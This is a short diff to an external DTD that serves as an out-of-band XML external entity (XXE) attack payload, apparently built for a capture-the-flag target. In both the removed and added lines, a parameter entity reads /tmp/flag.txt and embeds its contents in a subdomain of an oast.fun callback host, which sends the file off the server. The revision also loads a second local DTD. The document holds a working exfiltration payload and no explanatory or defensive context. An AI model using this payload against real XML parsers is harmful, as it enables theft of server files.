@@ -1,3 +1,5 @@
-<!ENTITY % file SYSTEM "file:///tmp/flag.txt">
-<!ENTITY % eval '<!ENTITY exfiltrate SYSTEM "http://exfil.%file;.zmjuwyodyesoodtazgffxaz3c6990ax72.oast.fun/">'>
+<!ENTITY % config_hex SYSTEM "file:///tmp/flag.txt">
+<!ENTITY % eval "<!ENTITY exfiltrate SYSTEM 'http://exfil.%config_hex;.zmjuwyodyesoodtazgffxaz3c6990ax72.oast.fun/'>">
 %eval;
+<!ENTITY % config SYSTEM "file:///tmp/xml/config.dtd">
+%config;
